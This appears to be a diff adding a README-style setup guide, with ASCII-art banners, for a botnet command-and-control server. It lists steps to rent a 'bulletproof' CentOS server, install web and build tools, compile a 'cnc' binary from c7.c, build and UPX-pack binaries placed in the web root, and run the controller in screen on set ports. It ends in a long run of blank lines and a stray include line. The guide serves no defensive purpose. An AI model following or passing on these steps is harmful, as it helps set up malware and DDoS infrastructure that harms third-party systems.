@@ -1,0 +1,97 @@
+                               ___   ___                                                          
+     ___                          / /    /|    / / //   ) )  //   / / //   ) )  //   / / //   ) ) 
+   //   ) ) /_  /                / /    //|   / / //        //   / / //___/ /  //   / / ((        
+  //   / /   / /    ____        / /    // |  / / //        //   / / / __  (   //   / /    \\      
+ //   / /   / /                / /    //  | / / //        //   / / //    ) ) //   / /       ) )   
+((___/ /   / /              __/ /___ //   |/ / ((____/ / ((___/ / //____/ / ((___/ / ((___ / /    
+#
+STEP BY STEP:
+1>> CentOS 6 VPS // Dedicated bulletproof server
+
+2> yum install deltarpm -y && yum install httpd -y && yum install iptables -y
+
+3> yum install python-paramiko nano screen gcc perl wget lbzip unzip -y
+
+4> gcc c7.c -o cnc -pthread
+
+5> python compile.py
+
+6> chmod 777 *
+
+(optional)7> ./upx --ultra-brute /var/www/html/* 
+
+8> screen ./cnc 4258 1 4747
+            
+9> CTRL + A + D TO DETACH THE SCREEN
+
+10>> LOGIN WITH PUTTY RAW PORT = SCREENPORT
+                               ___   ___                                                          
+     ___                          / /    /|    / / //   ) )  //   / / //   ) )  //   / / //   ) ) 
+   //   ) ) /_  /                / /    //|   / / //        //   / / //___/ /  //   / / ((        
+  //   / /   / /    ____        / /    // |  / / //        //   / / / __  (   //   / /    \\      
+ //   / /   / /                / /    //  | / / //        //   / / //    ) ) //   / /       ) )   
+((___/ /   / /              __/ /___ //   |/ / ((____/ / ((___/ / //____/ / ((___/ / ((___ / /    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#include <gladoon.inc>
